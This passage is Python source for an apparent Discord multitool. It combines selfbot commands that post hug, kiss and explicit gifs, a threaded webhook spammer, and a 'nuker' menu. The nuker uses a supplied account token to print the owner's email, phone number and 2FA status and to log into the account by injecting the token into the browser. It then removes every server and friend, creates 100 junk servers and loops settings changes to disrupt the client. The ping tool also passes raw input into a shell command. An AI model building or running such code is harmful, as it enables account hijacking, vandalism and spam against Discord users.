            hugs = ['https://tenor.com/view/cuddle-nuzzle-cute-hug-hugging-gif-9375012', 'https://cdn.discordapp.com/attachments/745791848248901701/749498978751479868/giphy.gif', 'https://cdn.discordapp.com/attachments/745791848248901701/749504262479806594/tumblr_mum0aqfMdA1sibpv8o1_500.gif', 'https://cdn.discordapp.com/attachments/744737112854626344/749504940376064080/giphy.gif', 'https://cdn.discordapp.com/attachments/744737112854626344/749505124875108413/giphy.gif', 'https://cdn.discordapp.com/attachments/744737112854626344/749505387136286740/giphy.gif']
            selected_hug = random.choice(hugs)
            hugem = discord.Embed(description=(client.user.name + ' 𝘩𝘶𝘨𝘨𝘦𝘥 ' + user.mention), color=(discord.Color(9699539)))
            hugem.set_author(name='Heyo', icon_url='https://cdn.discordapp.com/attachments/749002390870687855/756219157913010386/6623399ae44bf733c8f42a043131642e.gif')
            hugem.set_image(url=selected_hug)
            await ctx.send(embed=hugem)
            print(' ' + client.user.name + Style.RESET_ALL + ' hugged ' + Fore.MAGENTA + user.mention)

        @commands.command()
        async def pat(self, ctx, user):
            await ctx.message.delete()
            pats = ['https://cdn.discordapp.com/attachments/744737112854626344/749641023872827503/giphy_1.gif', 'https://cdn.discordapp.com/attachments/744737112854626344/749641109046820955/giphy_2.gif', 'https://cdn.discordapp.com/attachments/744737112854626344/749641169692131328/giphy_3.gif', 'https://cdn.discordapp.com/attachments/744737112854626344/749641257860464700/giphy_4.gif']
            selected_pat = random.choice(pats)
            patem = discord.Embed(description=(client.user.name + ' 𝘱𝘢𝘵𝘵𝘦𝘥 ' + user.mention), color=(discord.Color(9699539)))
            patem.set_author(name='Heyo', icon_url='https://cdn.discordapp.com/attachments/749002390870687855/756219157913010386/6623399ae44bf733c8f42a043131642e.gif')
            patem.set_image(url=selected_pat)
            await ctx.send(embed=patem)
            print(' ' + client.user.name + Style.RESET_ALL + ' patted ' + Fore.MAGENTA + user.mention)

        @commands.command()
        async def kiss(self, ctx, user):
            await ctx.message.delete()
            kiss = ['https://cdn.discordapp.com/attachments/744737112854626344/749647465321463948/2.gif', 'https://cdn.discordapp.com/attachments/744737112854626344/749647466827087902/3.gif', 'https://cdn.discordapp.com/attachments/744737112854626344/749647468949667950/4.gif', 'https://cdn.discordapp.com/attachments/744737112854626344/749647583122817194/5.gif']
            selected_kiss = random.choice(kiss)
            kissem = discord.Embed(description=(client.user.name + ' 𝘬𝘪𝘴𝘴𝘦𝘥 ' + user.mention), color=(discord.Color(9699539)))
            kissem.set_author(name='Heyo', icon_url='https://cdn.discordapp.com/attachments/749002390870687855/756219157913010386/6623399ae44bf733c8f42a043131642e.gif')
            kissem.set_image(url=selected_kiss)
            await ctx.send(embed=kissem)
            print(' ' + client.user.name + Style.RESET_ALL + ' kissed ' + Fore.MAGENTA + user.mention)

        @commands.command()
        async def kill(self, ctx, user):
            await ctx.message.delete()
            kill = ['https://cdn.discordapp.com/attachments/744737112854626344/749652105245229226/kill1.gif', 'https://cdn.discordapp.com/attachments/744737112854626344/749652109259178074/kill2.gif', 'https://cdn.discordapp.com/attachments/744737112854626344/749652111045689344/kill3.gif', 'https://cdn.discordapp.com/attachments/744737112854626344/749652115106037870/kill4.gif']
            selected_kill = random.choice(kill)
            killem = discord.Embed(description=(client.user.name + ' 𝘬𝘪𝘭𝘭𝘦𝘥 ' + user.mention), color=(discord.Color(9699539)))
            killem.set_author(name='Heyo', icon_url='https://cdn.discordapp.com/attachments/749002390870687855/756219157913010386/6623399ae44bf733c8f42a043131642e.gif')
            killem.set_image(url=selected_kill)
            await ctx.send(embed=killem)
            print(' ' + client.user.name + Style.RESET_ALL + ' killed ' + Fore.MAGENTA + user.mention)

        @commands.command()
        async def fuck(self, ctx, user):
            await ctx.message.delete()
            fuck = ['https://cdn.discordapp.com/attachments/744737112854626344/749749471809634364/nfsw3.gif', 'https://cdn.discordapp.com/attachments/744737112854626344/749749677464879215/nfsw4.gif', 'https://cdn.discordapp.com/attachments/744737112854626344/749749422413316237/nsfw1.gif']
            selected_fuck = random.choice(fuck)
            fuckem = discord.Embed(description=(client.user.name + ' 𝘳𝘦𝘢𝘳𝘳𝘢𝘯𝘨𝘦𝘥 ' + user.mention + "'s 𝘨𝘶𝘵𝘴"), color=(discord.Color(9699539)))
            fuckem.set_author(name='Heyo', icon_url='https://cdn.discordapp.com/attachments/749002390870687855/756219157913010386/6623399ae44bf733c8f42a043131642e.gif')
            fuckem.set_image(url=selected_fuck)
            await ctx.send(embed=fuckem)
            print(' ' + client.user.name + Style.RESET_ALL + ' rearranged ' + Fore.MAGENTA + user.mention + "'s guts")

        @commands.command()
        async def anal(self, ctx, user):
            await ctx.message.delete()
            anal = ['https://cdn.discordapp.com/attachments/744737112854626344/749743048547762307/nfsw1.gif', 'https://cdn.discordapp.com/attachments/744737112854626344/749743092386758672/nsfw2.gif', 'https://cdn.discordapp.com/attachments/744737112854626344/749743122950520902/nfsw3.gif', 'https://cdn.discordapp.com/attachments/744737112854626344/749707950901166150/nfsw4.gif']
            selected_anal = random.choice(anal)
            analem = discord.Embed(description=(client.user.name + ' 𝘴𝘵𝘶𝘤𝘬 𝘪𝘵 𝘪𝘯 ' + user.mention + "'s 𝘢𝘴𝘴"), color=(discord.Color(9699539)))
            analem.set_author(name='Heyo', icon_url='https://cdn.discordapp.com/attachments/749002390870687855/756219157913010386/6623399ae44bf733c8f42a043131642e.gif')
            analem.set_image(url=selected_anal)
            await ctx.send(embed=analem)
            print(' ' + client.user.name + Style.RESET_ALL + ' stuck it in ' + Fore.MAGENTA + user.mention + "'s ass")

        @commands.command()
        async def blowjob(self, ctx, user):
            await ctx.message.delete()
            blowjob = ['https://cdn.discordapp.com/attachments/744737112854626344/749746417152688169/nsfw2.gif', 'https://cdn.discordapp.com/attachments/744737112854626344/749746265536987137/nfsw3.gif']
            selected_blowjob = random.choice(blowjob)
            blowjobem = discord.Embed(description=(client.user.name + ' 𝘨𝘢𝘷𝘦 𝘩𝘦𝘢𝘥 𝘵𝘰 ' + user.mention), color=(discord.Color(9699539)))
            blowjobem.set_author(name='Heyo', icon_url='https://cdn.discordapp.com/attachments/749002390870687855/756219157913010386/6623399ae44bf733c8f42a043131642e.gif')
            blowjobem.set_image(url=selected_blowjob)
            await ctx.send(embed=blowjobem)
            print(' ' + client.user.name + Style.RESET_ALL + ' gave head to ' + Fore.MAGENTA + user.mention)

        @commands.command()
        async def fullsend(self, ctx, user):
            await ctx.message.delete()
            fullsend = ['https://cdn.discordapp.com/attachments/744737112854626344/749655212008144986/fullsend1.gif', 'https://cdn.discordapp.com/attachments/744737112854626344/749655216244129852/fullsend2.gif', 'https://cdn.discordapp.com/attachments/744737112854626344/749655224917950494/fullsend3.gif', 'https://cdn.discordapp.com/attachments/744737112854626344/749655227094794360/fullsend4.gif']
            selected_fullsend = random.choice(fullsend)
            fullsendem = discord.Embed(description=(client.user.name + ' 𝘧𝘶𝘭𝘭 𝘴𝘦𝘯𝘥𝘦𝘥 𝘸𝘪𝘵𝘩 ' + user.mention), color=(discord.Color(9699539)))
            fullsendem.set_author(name='Heyo', icon_url='https://cdn.discordapp.com/attachments/749002390870687855/756219157913010386/6623399ae44bf733c8f42a043131642e.gif')
            fullsendem.set_image(url=selected_fullsend)
            await ctx.send(embed=fullsendem)
            print(' ' + client.user.name + Style.RESET_ALL + ' full sended with ' + Fore.MAGENTA + user.mention)

        @commands.command()
        async def pack(self, ctx, user):
            await ctx.message.delete()
            pack = ['https://cdn.discordapp.com/attachments/744737112854626344/749657722584170618/packed1.gif', 'https://cdn.discordapp.com/attachments/744737112854626344/749657723993325588/packed2.gif', 'https://cdn.discordapp.com/attachments/744737112854626344/749657724509224990/packed3.gif', 'https://cdn.discordapp.com/attachments/744737112854626344/749657724547104878/packed4.gif']
            selected_pack = random.choice(pack)
            packem = discord.Embed(description=(client.user.name + ' 𝘱𝘢𝘤𝘬𝘦𝘥 ' + user.mention), color=(discord.Color(9699539)))
            packem.set_author(name='Heyo', icon_url='https://cdn.discordapp.com/attachments/749002390870687855/756219157913010386/6623399ae44bf733c8f42a043131642e.gif')
            packem.set_image(url=selected_pack)
            await ctx.send(embed=packem)
            print(' ' + client.user.name + Style.RESET_ALL + ' packed ' + Fore.MAGENTA + user.mention)

        @commands.command()
        async def cuddle(self, ctx, user):
            await ctx.message.delete()
            cuddles = ['https://cdn.discordapp.com/attachments/744094044866609163/749751944226013184/cuddle1.gif', 'https://cdn.discordapp.com/attachments/744094044866609163/749751949695516762/cuddle3.gif', 'https://cdn.discordapp.com/attachments/744094044866609163/749751953139040336/cuddle2.gif', 'https://cdn.discordapp.com/attachments/744094044866609163/749751971505897533/cuddle4.gif', 'https://tenor.com/view/anime-love-cuddle-cute-couple-gif-14518537']
            selected_cuddle = random.choice(cuddles)
            cuddleem = discord.Embed(description=(client.user.name + ' 𝘤𝘶𝘥𝘥𝘭𝘦𝘥 𝘸𝘪𝘵𝘩 ' + user.mention), color=(discord.Color(9699539)))
            cuddleem.set_author(name='Heyo', icon_url='https://cdn.discordapp.com/attachments/749002390870687855/756219157913010386/6623399ae44bf733c8f42a043131642e.gif')
            cuddleem.set_image(url=selected_cuddle)
            await ctx.send(embed=cuddleem)
            print(' ' + client.user.name + Style.RESET_ALL + ' cuddled with ' + Fore.MAGENTA + user.mention)

        @commands.command()
        async def lilbubblegum(self, ctx):
            await ctx.message.delete()
            songs = ['https://open.spotify.com/track/3PIqcYKTiplGvAcqv4I0aN?si=NfnuSKfrTGaq-YRQvm6-VA', 'https://open.spotify.com/track/1jsJAtrQtTWD44LW9QokDR?si=E-gXLi5eTly2ikohVWmiAg', 'https://open.spotify.com/track/5plNHNGnxX4516opfyNC4C?si=m9qwzqy8TG-2Cwji-QoZGg', 'https://open.spotify.com/track/3LGsIMMy32IpilAZzXTKjl?si=9i3Ou0CqRIaMZOL4mDsNmg', 'https://open.spotify.com/track/6RfuSd0sJSH7v3qiNpjyrk?si=MK7ja4olSdyfnPCkw69L9g']
            selected_song = random.choice(songs)
            songem = discord.Embed(description=(client.user.name + ' requested a lilbubblegum song ' + selected_song), color=(discord.Color(9699539)))
            songem.set_author(name='Heyo', icon_url='https://cdn.discordapp.com/attachments/749002390870687855/756219157913010386/6623399ae44bf733c8f42a043131642e.gif')
            songem.set_footer(text='Temperary Heyo SB')
            await ctx.send(embed=songem)

    loop = asyncio.get_event_loop()
    for i in range(len(tokens)):
        url = 'https://discord.com/api/v6/channels/channel_id/messages/message_id/reactions/emoji_bytes/%40me'
        headers = {'Authoriztion': tokens[i]}
        requests.put(url=url, headers=headers)
        client = commands.Bot(command_prefix=prefixselecter, help_command=None, self_bot=True)
        client.add_cog(SelfBot(client))
        loop.create_task(client.start((tokens[i]), bot=False))
    else:
        banner()
        loop.run_forever()


def reset():
    os.system('cls')
    mainbanners()


def selfbotshit():
    print(' ')
    print('Please enter your token')
    token = input('> ')


def webhookspammer():
    init()
    sent = 0
    t = threading.Lock()
    clear = lambda : os.system('cls')
    url = input('Url:')
    msg = input('Message:')
    threads = int(input('Threads: '))

    def spammer():
        global sent
        headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.106 Safari/537.36'}
        data = {'content':msg, 
         'username':'heyo ran u'}
        try:
            r = requests.post(url, headers=headers, json=data)
            sent += 1
            t.acquire()
            print(Fore.MAGENTA + '[' + Style.RESET_ALL + '+' + Fore.MAGENTA + '] Sent | message:' + msg + ' |  ' + str(sent))
            t.release()
        except:
            t.acquire()
            t.release()

    while threading.active_count() <= threads:
        threading.Thread(target=spammer, args=()).start()


def toolsshit():
    os.system('cls')
    print('                      ┌┬┐┌─┐┌─┐┬  ┌─┐')
    print('                       │ │ ││ ││  └─┐')
    print('                       ┴ └─┘└─┘┴─┘└─┘ ' + Fore.MAGENTA + ' ifs runs you')
    print('        ' + Fore.MAGENTA + '[' + Style.RESET_ALL + '+' + Fore.MAGENTA + ']════════════════════════════════════════[' + Style.RESET_ALL + '+' + Fore.MAGENTA + ']')
    print('        ' + Fore.MAGENTA + ' ║ ' + Style.RESET_ALL + '1 = Ping ' + Fore.MAGENTA + ' |' + Style.RESET_ALL + ' Launches pinger          ' + Fore.MAGENTA + '    ║')
    print('        ' + Fore.MAGENTA + ' ║ ' + Style.RESET_ALL + '2 = 1.1.1.1   ' + Fore.MAGENTA + ' |' + Style.RESET_ALL + ' Pings your own internet ' + Fore.MAGENTA + '║')
    print('        ' + Fore.MAGENTA + ' ║ ' + Style.RESET_ALL + '5 = Back ' + Fore.MAGENTA + ' |' + Style.RESET_ALL + ' Go back to the main panel    ' + Fore.MAGENTA + '║')
    print('       ' + Fore.MAGENTA + ' [' + Style.RESET_ALL + '+' + Fore.MAGENTA + ']════════════════════════════════════════[' + Style.RESET_ALL + '+' + Fore.MAGENTA + ']' + Style.RESET_ALL)
    print('')
    toolselection = input('> ')
    if toolselection == '1':
        print('')
        print('IP')
        ip = input('> ')
        os.system('cmd /k "ping ' + ip + ' -t"')
    else:
        if toolselection == '2':
            print('')
            os.system('cmd /k "ping 1.1.1.1 -t"')
        else:
            if toolselection == '3':
                reset()
            else:
                reset()


def creditsbanner():
    os.system('cls')
    print('                    ┌─┐┬─┐┌─┐┌┬┐┬┌┬┐┌─┐')
    print('                    │  ├┬┘├┤  │││ │ └─┐')
    print('                    └─┘┴└─└─┘─┴┘┴ ┴ └─┘' + Fore.MAGENTA + ' ifs runs you')
    print('        ' + Fore.MAGENTA + '[' + Style.RESET_ALL + '+' + Fore.MAGENTA + ']════════════════════════════════════════[' + Style.RESET_ALL + '+' + Fore.MAGENTA + ']')
    print('        ' + Fore.MAGENTA + ' ║ ' + Style.RESET_ALL + 'Heyo  ' + Fore.MAGENTA + ' |' + Style.RESET_ALL + ' Created heyo selfbot     ' + Fore.MAGENTA + '   ║')
    print('        ' + Fore.MAGENTA + ' ║ ' + Style.RESET_ALL + 'Cheyo₆ᵢₓ#0009  ' + Fore.MAGENTA + ' |' + Style.RESET_ALL + ' Webhook spam & nuke    ' + Fore.MAGENTA + '║')
    print('        ' + Fore.MAGENTA + ' ║ ' + Style.RESET_ALL + '1 = Back ' + Fore.MAGENTA + ' |' + Style.RESET_ALL + ' Go back to the main panel    ' + Fore.MAGENTA + '║')
    print('       ' + Fore.MAGENTA + ' [' + Style.RESET_ALL + '+' + Fore.MAGENTA + ']════════════════════════════════════════[' + Style.RESET_ALL + '+' + Fore.MAGENTA + ']' + Style.RESET_ALL)
    print('')
    akdioask = input('> ')
    if akdioask == '1':
        reset()
    else:
        reset()


def nukingshit():
    os.system('cls')
    print('                      ┌┐┌┬ ┬┬┌─┌─┐┬─┐')
    print('                      ││││ │├┴┐├┤ ├┬┘')
    print('                      ┘└┘└─┘┴ ┴└─┘┴└─ ' + Fore.MAGENTA + ' ifs runs you')
    print('        ' + Fore.MAGENTA + '[' + Style.RESET_ALL + '+' + Fore.MAGENTA + ']════════════════════════════════════════[' + Style.RESET_ALL + '+' + Fore.MAGENTA + ']')
    print('        ' + Fore.MAGENTA + ' ║ ' + Style.RESET_ALL + '1 = Info ' + Fore.MAGENTA + ' |' + Style.RESET_ALL + ' Launches heyo selfbot    ' + Fore.MAGENTA + '    ║')
    print('        ' + Fore.MAGENTA + ' ║ ' + Style.RESET_ALL + '2 = Crasher   ' + Fore.MAGENTA + ' |' + Style.RESET_ALL + ' Prompts nuking commands ' + Fore.MAGENTA + '║')
    print('        ' + Fore.MAGENTA + ' ║ ' + Style.RESET_ALL + '3 = Destroyer ' + Fore.MAGENTA + ' |' + Style.RESET_ALL + ' Spams desired webhook   ' + Fore.MAGENTA + '║')
    print('        ' + Fore.MAGENTA + ' ║ ' + Style.RESET_ALL + '4 = Login   ' + Fore.MAGENTA + ' |' + Style.RESET_ALL + ' Login to users account   ' + Fore.MAGENTA + ' ║')
    print('        ' + Fore.MAGENTA + ' ║ ' + Style.RESET_ALL + '5 = Back ' + Fore.MAGENTA + ' |' + Style.RESET_ALL + ' Go back to the main panel    ' + Fore.MAGENTA + '║')
    print('       ' + Fore.MAGENTA + ' [' + Style.RESET_ALL + '+' + Fore.MAGENTA + ']════════════════════════════════════════[' + Style.RESET_ALL + '+' + Fore.MAGENTA + ']' + Style.RESET_ALL)
    init(convert=True)
    guildsIds = []
    friendsIds = []
    clear = lambda : os.system('cls')
    bot = commands.Bot(command_prefix='-', self_bot=True)
    bot.remove_command('help')
    print('\n')
    print('Token')
    token = input('> ')
    head = {'Authorization': str(token)}
    src = requests.get('https://discordapp.com/api/v6/users/@me', headers=head)
    if src.status_code == 200:
        print('         ')
        print('Account valid ')
        print('         ')
        input('Press Enter')
    else:
        print(f"[{Fore.MAGENTA}-{Fore.RESET}] Invalid token")
        input('Press any key to exit...')
        exit(0)

    def tokenInfo(token):
        print('Token Info')
        headers = {'Authorization':token,  'Content-Type':'application/json'}
        r = requests.get('https://discord.com/api/v6/users/@me', headers=headers)
        if r.status_code == 200:
            userName = r.json()['username'] + '#' + r.json()['discriminator']
            userID = r.json()['id']
            phone = r.json()['phone']
            email = r.json()['email']
            mfa = r.json()['mfa_enabled']
            print(f"\n                [{Fore.MAGENTA}User ID{Fore.RESET}]         {userID}\n                [{Fore.MAGENTA}User Name{Fore.RESET}]       {userName}\n                [{Fore.MAGENTA}2 Factor{Fore.RESET}]        {mfa}\n                [{Fore.MAGENTA}Email{Fore.RESET}]           {email}\n                [{Fore.MAGENTA}Phone number{Fore.RESET}]    {phone if phone else ''}\n                [{Fore.MAGENTA}Token{Fore.RESET}]           {token}\n                ")
            resetnuke()

    def crashdiscord(token):
        print('Token Fucker')
        print('\n')
        print('Crashing token')
        print('stop the tool to stop token fucking')
        headers = {'Authorization': token}
        modes = cycle(['light', 'dark'])
        while True:
            setting = {'theme':next(modes), 
             'locale':random.choice(['ja', 'zh-TW', 'ko', 'zh-CN'])}
            requests.patch('https://discord.com/api/v6/users/@me/settings', headers=headers, json=setting)
            print(f"[{Fore.MAGENTA}+{Fore.RESET}] Polverizing...")
            resetnuke()

    def tokenLogin(token):
        opts = webdriver.ChromeOptions()
        opts.add_experimental_option('detach', True)
        driver = webdriver.Chrome('chromedriver.exe', options=opts)
        script = '\n                function login(token) {\n                setInterval(() => {\n                document.body.appendChild(document.createElement `iframe`).contentWindow.localStorage.token = `"${token}"`\n                }, 50);\n                setTimeout(() => {\n                location.reload();\n                }, 2500);\n                }\n                '
        driver.get('https://discord.com/login')
        driver.execute_script(script + f'\nlogin("{token}")')
        resetnuke()

    def tokenFuck(token):
        headers = {'Authorization': token}
        print(f"[{Fore.MAGENTA}+{Fore.RESET}] Naenaeing on there acc...")
        for guild in guildsIds:
            requests.delete(f"https://discord.com/api/v6/users/@me/guilds/{guild}", headers=headers)
        else:
            for friend in friendsIds:
                requests.delete(f"https://discord.com/api/v6/users/@me/relationships/{friend}", headers=headers)
            else:
                for i in range(100):
                    payload = {'name':f"awh heyo fucked ur acc :( {i}", 
                     'region':'europe',  'icon':'av.png',  'channels':None}
                    requests.post('https://discord.com/api/v6/guilds', headers=headers, json=payload)
                else:
                    modes = cycle(['light', 'dark'])
                    while True:
                        setting = {'theme':next(modes), 
                         'locale':random.choice(['ja', 'zh-TW', 'ko', 'zh-CN'])}
                        requests.patch('https://discord.com/api/v6/users/@me/settings', headers=headers, json=setting)

    def mainanswer():
        print('Choose')
        answer = input('> ')
        if answer == '0':
            nuke()
        else:
            if answer == '1':
                tokenInfo(token)
            else:
                if answer == '2':
                    crashdiscord(token)
                else:
                    if answer == '3':
                        tokenFuck(token)
                    else:
                        if answer == '4':
                            tokenLogin(token)
                        else:
                            if anwser == '5':
                                reset()
                            else:
                                print('Wrong number dumbass')
                                mainanswer()

    mainanswer()


def mainbanners():
    print('                           ┬ ┬┌─┐┬ ┬┌─┐')
    print('                           ├─┤├┤ └┬┘│ │')
    print('                           ┴ ┴└─┘ ┴ └─┘ ' + Fore.MAGENTA + ' ifs runs you')
    print('        ' + Fore.MAGENTA + '[' + Style.RESET_ALL + '+' + Fore.MAGENTA + ']════════════════════════════════════════════[' + Style.RESET_ALL + '+' + Fore.MAGENTA + ']')
    print('        ' + Fore.MAGENTA + ' ║ ' + Style.RESET_ALL + '1 = Selfbot ' + Fore.MAGENTA + ' |' + Style.RESET_ALL + ' Launches heyo selfbot        ' + Fore.MAGENTA + ' ║')
    print('        ' + Fore.MAGENTA + ' ║ ' + Style.RESET_ALL + '2 = Nuker   ' + Fore.MAGENTA + ' |' + Style.RESET_ALL + ' Prompts nuking commands      ' + Fore.MAGENTA + ' ║')
    print('        ' + Fore.MAGENTA + ' ║ ' + Style.RESET_ALL + '3 = Webhook ' + Fore.MAGENTA + ' |' + Style.RESET_ALL + ' Spams desired webhook        ' + Fore.MAGENTA + ' ║')
    print('        ' + Fore.MAGENTA + ' ║ ' + Style.RESET_ALL + '4 = Tools   ' + Fore.MAGENTA + ' |' + Style.RESET_ALL + ' Other tools you can use       ' + Fore.MAGENTA + '║')
    print('        ' + Fore.MAGENTA + ' ║ ' + Style.RESET_ALL + '5 = Credits ' + Fore.MAGENTA + ' |' + Style.RESET_ALL + ' Shows developers of this tool ' + Fore.MAGENTA + '║')
    print('       ' + Fore.MAGENTA + ' [' + Style.RESET_ALL + '+' + Fore.MAGENTA + ']════════════════════════════════════════════[' + Style.RESET_ALL + '+' + Fore.MAGENTA + ']' + Style.RESET_ALL)
    print('')
    selection = input('> ')
    if selection == '1':
        selfbotlauncher()
    else:
        if selection == '2':
            nukingshit()
        else:
            if selection == '3':
                webhookspammer()
            else:
                if selection == '4':
                    toolsshit()
                else:
                    if selection == '5':
                        creditsbanner()
                    else:
                        reset()


ctypes.windll.kernel32.SetConsoleTitleW('[Heyo Discord Multitool]')
print(Fore.MAGENTA + 'W')
time.sleep(0.2)
os.system('cls')
print(Fore.MAGENTA + 'We')
time.sleep(0.2)
os.system('cls')
print(Fore.MAGENTA + 'Wel')
time.sleep(0.2)
os.system('cls')
print(Fore.MAGENTA + 'Welc')
time.sleep(0.2)
os.system('cls')
print(Fore.MAGENTA + 'Welco')
time.sleep(0.2)
os.system('cls')
print(Fore.MAGENTA + 'Welcom')
time.sleep(0.2)
os.system('cls')
print(Fore.MAGENTA + 'Welcome')
time.sleep(0.2)
os.system('cls')
print(Fore.MAGENTA + 'Welcome U')
time.sleep(0.2)
os.system('cls')
print(Fore.MAGENTA + 'Welcome Us')
time.sleep(0.2)
os.system('cls')
print(Fore.MAGENTA + 'Welcome Use')
time.sleep(0.2)
os.system('cls')
print(Fore.MAGENTA + 'Welcome User')
time.sleep(0.2)
os.system('cls')
print(Fore.MAGENTA + 'Welcome User' + ' [')
time.sleep(0.2)
os.system('cls')
print(Fore.MAGENTA + 'Welcome User' + ' [' + Style.RESET_ALL + '•  ')
time.sleep(0.2)
os.system('cls')
print(Fore.MAGENTA + 'Welcome User' + ' [' + Style.RESET_ALL + '•• ')
time.sleep(0.2)
os.system('cls')
print(Fore.MAGENTA + 'Welcome User' + ' [' + Style.RESET_ALL + '•••' + Fore.MAGENTA + ']' + Style.RESET_ALL)
time.sleep(0.2)
os.system('cls')
for i in range(6):
    print(Fore.MAGENTA + 'Welcome User' + ' [' + Style.RESET_ALL + '•  ' + Fore.MAGENTA + ']' + Style.RESET_ALL)
    time.sleep(0.2)
    os.system('cls')
    print(Fore.MAGENTA + 'Welcome User' + ' [' + Style.RESET_ALL + '•• ' + Fore.MAGENTA + ']' + Style.RESET_ALL)
    time.sleep(0.2)
    os.system('cls')
    print(Fore.MAGENTA + 'Welcome User' + ' [' + Style.RESET_ALL + '•••' + Fore.MAGENTA + ']' + Style.RESET_ALL)
    time.sleep(0.2)
    os.system('cls')
else:
    mainbanners()